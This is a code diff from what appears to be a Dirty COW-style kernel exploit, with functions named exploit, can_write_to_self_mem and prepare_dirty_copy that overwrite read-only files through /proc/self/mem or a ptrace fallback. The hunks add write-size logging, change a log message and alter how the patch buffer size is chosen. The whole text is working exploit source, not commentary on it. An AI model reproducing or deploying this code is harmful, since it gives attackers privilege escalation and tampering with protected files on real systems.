@@ -2,6 +2,7 @@
 // Created by k.leyfer on 15.03.2017.
 //
 
+#include <malloc.h>
 #include "dirty_copy.h"
 #include "elf_parser.h"
 #include "file_utils.h"
@@ -135,9 +136,12 @@ static int can_write_to_self_mem(void *arg) {
 
   int returnval = -1;
   lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
-  if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size) {
+  int written;
+  if ((written = write(fd, mem_arg->patch, mem_arg->patch_size)) == mem_arg->patch_size) {
     returnval = 0;
   }
+
+  LOGV("Overwrite: %d vs %d", mem_arg->patch_size, written);
 
   close(fd);
   return returnval;
@@ -175,7 +179,7 @@ static void exploit(struct mem_arg *mem_arg) {
   mem_arg->success = 0;
 
   if (can_write_to_self_mem(mem_arg) == -1) {
-    LOGV("using ptrace");
+    LOGV("here using ptrace");
     g_pid = fork();
     if (g_pid) {
       pthread_create(&pth3, NULL, check_thread, mem_arg);
@@ -248,9 +252,9 @@ static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct
     LOGV("Source file size (%u) and destination file size (%u) differ!\n", src_size, dst_size);
     if (src_size > dst_size) {
       LOGV("Possible corruption detected!\n");
-    } else {
-      size = dst_size;
     }
+
+    size = dst_size;
   }
 
   mem_arg->patch = malloc(size);
